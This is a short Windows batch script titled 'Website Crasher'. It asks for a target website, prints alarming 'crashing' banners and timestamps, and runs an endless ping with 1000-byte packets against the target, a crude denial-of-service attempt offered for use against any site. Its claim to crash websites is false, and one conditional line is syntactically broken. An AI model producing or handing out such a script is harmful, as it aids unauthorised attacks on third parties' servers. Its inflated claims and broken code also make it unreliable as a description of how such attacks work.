@echo off
Title Website Crasher
color 0e
goto TheQuestion
:TheQuestion
cls
echo Enter the website you would like to crash
set website=
set /p website= Enter your Website here:
if not defined website goto TheQuestion
if %website%==goto A if NOT B
cls
echo Processing Your request
ping localhost>nul
cls
echo To end Crashing press CTRL + C
ping localhost>nul
cls
color c
echo ----------------------------------------------------------------------
echo Now Crashing Website... DO NOT CLOSE THIS BOX!! PRESS CRTL + C TO END!!
echo ----------------------------------------------------------------------
echo Website about to be crashed:%website%
echo Time that Crashing Start:%time%
echo Date that Crashing Start:%date%
echo Log:
ping %website% -t -l 1000
cls
color 0e
echo Finished!
echo Website about to be crashed:%website%
echo Time that Crashing Stopped:%time%
echo Date that Crashing Stopped:%date%
echo Press any key to exit.
pause>nul
exit